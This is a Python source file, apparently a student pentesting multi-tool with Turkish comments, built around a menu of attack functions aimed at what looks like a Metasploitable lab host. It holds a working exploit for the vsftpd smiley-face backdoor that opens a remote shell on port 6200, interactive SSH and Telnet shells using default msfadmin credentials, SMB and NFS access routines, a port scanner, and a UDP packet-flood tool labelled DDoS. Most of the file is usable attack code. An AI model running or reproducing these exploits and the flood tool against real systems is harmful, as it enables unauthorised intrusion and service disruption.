from rich.console import Console
from rich.panel import Panel


def ftp_exploit():
    # Kodun genel amacı, bir FTP (File Transfer Protocol) sunucusunda bulunan bir açık üzerinden sisteme erişim sağlamak.
    # FTP sunucuları, dosya aktarımı için kullanılan ve genelde ağda çalışan programlardır.Kod, önce FTP sunucusuna bağlanıyor,
    # sahte bilgilerle giriş yapmayı deniyor ve ardından sistemde bir arka kapı açarak komutlar çalıştırıyor.
    import socket

    def exploit_ftp_backdoor(target_ip, target_port=21):
        try:
            print(f"[+] Connecting to {target_ip}:{target_port}")
            # FTP sunucusuna bağlan
            ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ftp_socket.connect((target_ip, target_port))

            # FTP sunucusundan gelen yanıtı oku
            response = ftp_socket.recv(1024).decode()
            print(f"[+] FTP Response: {response.strip()}")

            # Zafiyetli kullanıcı adı gönder
            payload = "USER test:)\r\n"
            print(f"[+] Sending payload: {payload.strip()}")
            ftp_socket.send(payload.encode())

            # FTP sunucusundan yanıt bekle
            response = ftp_socket.recv(1024).decode()
            print(f"[+] FTP Response: {response.strip()}")

            # Şifre kısmı (dummy data)
            ftp_socket.send(b"PASS test\r\n")
            response = ftp_socket.recv(1024).decode()
            print(f"[+] FTP Response: {response.strip()}")

            # Backdoor shell için bağlantı
            print(f"[+] Attempting to connect to the backdoor shell on {target_ip}:6200")
            shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_socket.connect((target_ip, 6200))
            print("[+] Connected to the backdoor shell! Type commands below:")

            while True:
                command = input("Shell> ")
                if command.lower() in ['exit', 'quit']:
                    print("[+] Exiting shell.")
                    break
                shell_socket.send((command + "\n").encode())
                response = shell_socket.recv(4096).decode()
                print(response)

            shell_socket.close()
        except Exception as e:
            print(f"[-] An error occurred: {e}")

    if __name__ == "__main__":
        target_ip = input("Enter target IP: ")
        exploit_ftp_backdoor(target_ip)


def ssh_exploit():
    import paramiko #SSH protokolü üzerinden bağlantı kurmak için kullanılan bir Python kütüphanesi.
    # Güvenlik testleri ve uzaktan yönetim için kullanılıyor.

    # Hedef sistem bilgileri
    target_ip = "10.2.0.101"  # Hedef IP adresini buraya girin
    target_port = 22  # SSH portu (default 22)
    username = "msfadmin"  # Hedef sistemdeki kullanıcı adı
    password = "msfadmin"  # Hedef sistemdeki şifre

    # Paramiko SSH client oluşturulması
    client = paramiko.SSHClient()

    # Güvenlik uyarılarını yok saymak için
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Hedef sisteme SSH bağlantısı kuruluyor
        print(f"[*] Bağlanıyor {target_ip}...")
        client.connect(target_ip, port=target_port, username=username, password=password)
        print(f"[*] Bağlandı {target_ip}")

        # Etkileşimli komut için shell başlatma
        print(f"[*] Shell açılıyor...")
        channel = client.invoke_shell()  # Etkileşimli shell açma

        while True:
            # Kullanıcıdan komut al
            command = input(f"{username}@{target_ip}# ")

            if command.lower() == 'Çıkış':  # çıkış komutu girilirse döngüden çıkılır
                print(f"[*] Çıkış yapılıyor...")
                break

            # Komutu hedef sisteme gönder
            channel.send(command + '\n')

            # Komutun çıktısını al
            output = channel.recv(1024).decode('utf-8')
            print(output)

        client.close() #SSH bağlantısını düzgün bir şekilde sonlandırıyoruz
        print(f"[*] Bağlantı sonlandırıldı {target_ip}")

    except Exception as e: #Hata durumunda kullanıcıya hatanın ne olduğunu bildiren bir mesaj gösterir.
        print(f"[-] Error: {str(e)}")

    print("[SSH Exploit Fonksiyonu]")

def telnet_exploit(): #Telnet protokolü üzerinden bağlantı kurmak ve iletişim sağlamak için kullanılan Python kütüphanesi.
    import telnetlib
    import time

    # Hedef sistem bilgileri
    target_ip = "10.2.0.101"  # Hedef IP adresini buraya girin
    target_port = 23  # Telnet portu (default 23)
    username = "msfadmin"  # Hedef sistemdeki kullanıcı adı
    password = "msfadmin"  # Hedef sistemdeki şifre

    # Telnet bağlantısını kurma
    try:
        print(f"[*] Bağlanıyor.. {target_ip}...")
        tn = telnetlib.Telnet(target_ip, target_port)  # Telnet bağlantısı

        # Kullanıcı adı ve şifreyi gönderme
        tn.read_until(b"login: ") #Sunucudan "login:" mesajını bekler
        tn.write(username.encode('ascii') + b"\n") #Kullanıcı adını Telnet sunucusuna gönderir
        tn.read_until(b"Password: ")#Sunucudan "Password:" mesajını bekler
        tn.write(password.encode('ascii') + b"\n")#Şifreyi Telnet sunucusuna gönderir

        print(f"[*] Başarıyla giriş yapıldı {target_ip}")

        # Etkileşimli shell için komut gönderme
        while True:
            command = input(f"{username}@{target_ip}# ")

            if command.lower() == 'çıkış':
                print(f"[*] Çıkış yapılıyor...")
                tn.write(b"exit\n")
                break

            # Komutu Telnet üzerinden gönderme
            tn.write(command.encode('ascii') + b"\n")

            # Komutun çıktısını al ve göster
            time.sleep(1)  # Çıktının alınması için biraz bekleyelim
            output = tn.read_very_eager().decode('ascii')
            print(output)

        tn.close()
        print(f"[*] Bağlantı sonlandırıldı. {target_ip}")

    except Exception as e:
        print(f"[-] Hata: {str(e)}")

    print("[Telnet Exploit Fonksiyonu]")

def netbios_exploit():
    from smb.SMBConnection import SMBConnection #SMB (Server Message Block) protokolü ile ağ üzerinden
    #paylaşılan kaynaklara erişim sağlamak için kullanılan bir sınıf.

    def test_netbios(ip): #NetBIOS servisini test etmek için bir fonksiyon tanımlar
        print(f"[*] NetBIOS-SSN servisine bağlanıyor: {ip}")

        try:
            conn = SMBConnection('', '', '', '', use_ntlm_v2=True)
            conn.connect(ip, 139)
            print(f"[*] Bağlantı başarılı: {ip}")

            # Örnek olarak paylaşılan dosyaları listeleyelim
            shares = conn.listShares()
            print("[*] Paylaşılan dosyalar:")
            for share in shares:
                print(f"- {share.name}")

            # Hedef sisteme erişim sağlandığında paylaşılan dizinlerin listelenmesi
            conn.close()
        except Exception as e:
            print(f"[-] Bağlantı başarısız: {e}")

    def main():
        target_ip = input("Hedef IP adresini girin: ")
        test_netbios(target_ip)

    if __name__ == "__main__":
        main()

    print("[NetBIOS Exploit Function Placeholder]")

def microsoft_ssn_exploit():
    from smb.SMBConnection import SMBConnection #SMB protokolü aracılığıyla ağ üzerindeki
    #paylaşılan kaynaklara erişim sağlamak için kullanılan bir sınıf.


    def smb_exploit(target_ip, username, password):
        # Bağlantıyı başlat
        conn = SMBConnection(username, password, "saldırgan", "hedef", use_ntlm_v2=True)

        print(f"[*] Bağlantı {target_ip} SMB Portuna kuruluyor...")
        try:
            # Hedefe bağlan
            conn.connect(target_ip, 445)

            print(f"[*] Bağlantı başarılı. {target_ip}")

            # Paylaşılan dosya ve klasörleri listele
            shares = conn.listShares()
            print("[*] Mevcut paylaşımlar:")
            for share in shares:
                print(f"Paylaşılan isim: {share.name}")

            # Örnek: Paylaşılan dosyayı listelemek
            for share in shares:
                if share.name != "IPC$":  # IPC$ genellikle bağlantı için kullanılır
                    print(f"[*] Dinlenen Dosyalar {share.name}")
                    files = conn.listPath(share.name, "/")
                    for file in files:
                        print(f"Dosya adı : {file.filename}")

        except Exception as e:
            print(f"[-] Hata: {e}")
        finally: #Kod hangi durumda olursa olsun (başarı veya hata), SMB bağlantısını düzgün bir şekilde sonlandırır.
            conn.close()
            print(f"[*] Bağlantı sonlandırıldı.")

    if __name__ == "__main__":
        target_ip = input("Hedef IP Adresini giriniz: ")
        username = input("Kullanıcı adı giriniz: ")
        password = input("Şifre giriniz: ")

        smb_exploit(target_ip, username, password)

    print("[Microsoft-Ssn Exploit Fonksiyonu]")

def rpcbind_exploit():
    import subprocess

    # Hedef IP adresi ve rpcbind portu
    target_ip = "10.2.0.101"
    rpcbind_port = 111

    # NFS portlarını taramak için rpcinfo komutunu kullanacağız.
    def get_nfs_ports(target_ip):
        try:
            print("[*] rpcbind servisi ile bağlantı sağlanıyor...")
            # rpcinfo komutunu çalıştırarak NFS portlarını bulma
            command = f"rpcinfo -p {target_ip}"
            result = subprocess.check_output(command, shell=True).decode("utf-8")

            print("[*] rpcinfo çıktısı alındı:")
            print(result)

            # Buradan NFS servisiyle ilgili portları alıyoruz.
            # Genellikle NFS 2049 portunda çalışır.
            if "2049" in result:
                print("[*] NFS servisi tespit edildi. Port: 2049")
                return True
            else:
                print("[-] NFS servisi tespit edilemedi.")
                return False
        except subprocess.CalledProcessError as e:
            print(f"[-] rpcinfo komutu hatalı: {e}")
            return False

    # FTP benzeri NFS üzerinden dosya erişimi
    def access_nfs(target_ip):
        print("[*] NFS servisi üzerinden dosya sistemine erişim sağlanıyor...")

        try:
            # NFS'yi mount etmek için komut kullanıyoruz
            # Örneğin: sudo mount -t nfs 10.2.0.101:/ /mnt
            command = f"sudo mount -t nfs {target_ip}:/ /mnt"
            subprocess.check_output(command, shell=True)
            print(f"[*] NFS üzerinden {target_ip} sistemine bağlanıldı.")

            # Erişilen dosya sisteminde bazı dosyaları kontrol edebiliriz
            print("[*] Bağlantı sonrası hedef sistemdeki dosya listesi:")
            subprocess.call("ls /mnt", shell=True)
        except subprocess.CalledProcessError as e:
            print(f"[-] Hata: NFS bağlantısı kurulamadı. {e}")

    # RPCBind ve NFS üzerinden sızma başlatma
    def exploit_rpcbind(target_ip):
        if get_nfs_ports(target_ip):
            access_nfs(target_ip)
        else:
            print("[-] RPCBind üzerinden NFS servisi tespit edilemedi.")

    # Hedef IP üzerinden exploit başlatıyoruz
    exploit_rpcbind(target_ip)

    print("[Rpcbind Exploit Fonksiyonu]")

def irc_exploit():
    import socket

    def exploit_irc(target_ip, target_port, nickname="exploit_bot"):
        """
        IRC zafiyetlerini test eden bir araç. Metasploit'teki IRC zafiyetlerini
        tespit etmek veya test etmek için kullanılabilir.
        """
        try:
            print(f"[*] Connecting to {target_ip} on port {target_port}...")

            # IRC bağlantısını oluştur
            irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            irc_socket.connect((target_ip, target_port))

            # NICK ve USER komutlarını gönder
            irc_socket.sendall(f"NICK {nickname}\r\n".encode("utf-8"))
            irc_socket.sendall(f"USER {nickname} 0 * :Exploit User\r\n".encode("utf-8"))
            print("[*] Bağlantı kuruldu. Sunucu yanıtı bekleniyor...")

            # Gelen mesajları dinle
            while True:
                response = irc_socket.recv(4096).decode("utf-8")
                print("[*] Sunucu Yanıtı:")
                print(response)

                # Ping-Pong mekanizması
                if response.startswith("PING"):
                    pong_response = response.split("PING")[1].strip()
                    irc_socket.sendall(f"PONG {pong_response}\r\n".encode("utf-8"))
                    print(f"[*] Gönderildi PONG {pong_response}")

                # Eğer MOTD (376) mesajı geldiyse, zafiyet testi için komut gönder
                if "376" in response:
                    print("[*] MOTD Alındı. Exploit payload gönderiliyor...")

                    # Exploit testi için örnek komut (Bir kanal oluşturmayı deneyebiliriz)
                    irc_socket.sendall("JOIN #exploit_test_channel\r\n".encode("utf-8"))
                    print("[*] Test kanalı oluşturuldu ve 'Join' komutu gönderildi.")

                    # Sunucuya zararlı yük (örnek) göndermek
                    payload = "PRIVMSG #exploit_test_channel :Exploit Test Payload\r\n"
                    irc_socket.sendall(payload.encode("utf-8"))
                    print(f"[*] Payload Gönderildi: {payload.strip()}")
                    break

            # Gelen cevapları dinle
            while True:
                response = irc_socket.recv(4096).decode("utf-8")
                print("[*] Server Response:")
                print(response)

                # Kanalın zafiyet işaretlerini kontrol et
                if "NOTICE" in response or "Hata" in response:
                    print("[*] Potential vulnerability detected in the IRC server.")
                    break

            # Bağlantıyı kapat
            irc_socket.close()
            print("[*] Bağlantı sonlandırıldı.")

        except Exception as e:
            print(f"[-] Hata: {e}")

    # Kullanıcıdan hedef bilgilerini al
    target_ip = input("Hedef IP Adresi giriniz: (Metasploit IRC Server IP): ")
    target_port = 6667  # IRC varsayılan port

    # IRC zafiyet taraması başlat
    exploit_irc(target_ip, target_port)

    print("[IRC Exploit Fonksiyonu]")


def nmap_exploit():
    import socket
    from concurrent.futures import ThreadPoolExecutor

    def scan_port(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                try:
                    service = socket.getservbyport(port)
                except OSError:
                    service = "Bilinmeyen"
                return port, service
        except:
            return None

    def port_scanner(ip, ports=range(1, 1025)):
        print(f"[+] {ip} ip adresindeki açık portlar taranıyor...")
        open_ports = []
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(lambda p: scan_port(ip, p), ports)

        for result in results:
            if result:
                open_ports.append(result)

        if open_ports:
            print("\n[+] Açık portlar:")
            for port, service in open_ports:
                print(f"Port {port}: {service}")
        else:
            print("\n[-] Açık portlar bulunamadı.")

    if __name__ == "__main__":
        target_ip = input("Hedef IP Adresini giriniz: ")
        port_scanner(target_ip)

    print("[Nmap Tarama Fonksiyonu]")

def mac_lookup():
    import subprocess
    import re
    from rich.console import Console
    from rich.table import Table

    def list_mac_addresses():
        console = Console()

        console.print("\n[bold green]Ağdaki cihazlar taranıyor...[/bold green]\n")

        # Execute the "arp -a" command to retrieve MAC and IP addresses
        try:
            output = subprocess.check_output("arp -a", shell=True, text=True)

            table = Table(title="Network Cihazları")
            table.add_column("IP Adresi", style="cyan")
            table.add_column("MAC Adresi", style="magenta")

            # Regex pattern to extract IP and MAC addresses
            pattern = re.compile(r"(\d+\.\d+\.\d+\.\d+)\s+.*?(([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2})")
            matches = pattern.findall(output)

            if matches:
                for match in matches:
                    ip_address, mac_address = match[0], match[1]
                    table.add_row(ip_address, mac_address)

                console.print(table)
            else:
                console.print("[bold red]Cihaz bulunamadı.[/bold red]")

        except Exception as e:
            console.print(f"[bold red]Network tarama hatası: {e}[/bold red]")

    # Call the function
    if __name__ == "__main__":
        list_mac_addresses()

    print("[MAC Lookup Function Placeholder]")


def ddos_attack():
    from rich.console import Console
    from rich.panel import Panel
    import socket
    import threading

    console = Console()

    def ddos_attack(target_ip, target_port, message, num_packets):
        def send_packets():
            for _ in range(num_packets):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(message.encode('utf-8'), (target_ip, target_port))
                    console.print(f"[bold green]Packet sent to {target_ip}:{target_port}[/bold green]")
                except Exception as e:
                    console.print(f"[bold red]Error:[/bold red] {e}")

        # Tek thread ile belirli sayıda paket göndermek için
        t = threading.Thread(target=send_packets)
        t.start()
        t.join()

    def ddos_tool():
        console.print(Panel("[bold red]DDoS Attack Aracı[/bold red]", expand=False))
        target_ip = console.input("[bold blue]Hedef IP Adresini girin: [/bold blue]")
        target_port = int(console.input("[bold blue]Hedef portu girin: [/bold blue]"))
        message = console.input("[bold blue]Gönderilecek paket mesajını girin: [/bold blue]")
        num_packets = int(console.input("[bold blue]Gönderilecek paket sayısını girin: [/bold blue]"))

        console.print("[bold yellow]DDoS atağı başlıyor...[/bold yellow]")
        ddos_attack(target_ip, target_port, message, num_packets)

    if __name__ == "__main__":
        ddos_tool()



def sifre_olusturucu():
        import random
        import string


        # Şifre oluşturma fonksiyonu
        def generate_password(length, complexity):
            # Karakter setini belirleme
            if complexity == 1:
                # Basit: sadece küçük harfler
                characters = string.ascii_lowercase
            elif complexity == 2:
                # Orta: küçük ve büyük harfler
                characters = string.ascii_letters
            elif complexity == 3:
                # Zor: küçük, büyük harfler ve rakamlar
                characters = string.ascii_letters + string.digits
            elif complexity == 4:
                # Çok zor: küçük, büyük harfler, rakamlar ve semboller
                characters = string.ascii_letters + string.digits + string.punctuation
            else:
                print("Geçersiz zorluk seviyesi.")
                return None

            # Rastgele şifre oluşturma
            password = ''.join(random.choice(characters) for _ in range(length))

            return password


        # Kullanıcıdan girdi alma
        def main():
            print("Güçlü Şifre Oluşturucu")
            length = int(input("Şifrenizin uzunluğunu girin (Karakter Uzunluğu): "))
            print("Zorluk seviyesini seçin:")
            print("1 - Basit (Yalnızca küçük harfler)")
            print("2 - Orta (Küçük ve büyük harfler)")
            print("3 - Zor (Küçük ve büyük harfler, rakamlar)")
            print("4 - Çok Zor (Küçük ve büyük harfler, rakamlar, semboller)")

            complexity = int(input("Seçiminizi yapın (1-4): "))

            password = generate_password(length, complexity)

            if password:
                print("Oluşturulan şifre:", password)


        # Programı çalıştırma
        if __name__ == "__main__":
            main()




def main_menu():
    console = Console()

    while True:

        console.print(Panel("Grup 4 - Pentester Multi Tool\n "
                            "1. FTP Exploit\n"
                            "2. SSH Exploit\n"
                            "3. Telnet Exploit\n"
                            "4. NetBIOS-SSN Exploit\n"
                            "5. Microsoft-DS Exploit\n"
                            "6. Rpcbind Exploit\n"
                            "7. IRC Exploit\n"
                            "8. Nmap Tarama\n"
                            "9. MAC Sorgulama\n"
                            "10. DDOS Attack\n "
                            "11. Güçlü Şifre Oluşturucu\n "
                            "0. Exit"))

        choice = input("\n Lütfen yapılacak işlemi seçiniz:  ")

        if choice == "1":
            ftp_exploit()
        elif choice == "2":
            ssh_exploit()
        elif choice == "3":
            telnet_exploit()
        elif choice == "4":
            netbios_exploit()
        elif choice == "5":
            microsoft_ssn_exploit()
        elif choice == "6":
            rpcbind_exploit()
        elif choice == "7":
            irc_exploit()
        elif choice == "8":
            nmap_exploit()
        elif choice == "9":
            mac_lookup()
        elif choice == "10":
            ddos_attack()
        elif choice == "11":
            sifre_olusturucu()
        elif choice == "0":
            print("Çıkış yapılıyor... Teşekkürler!")
            break
        else:
            print("Lütfen tekrar deneyin.")

if __name__ == "__main__":
    main_menu()
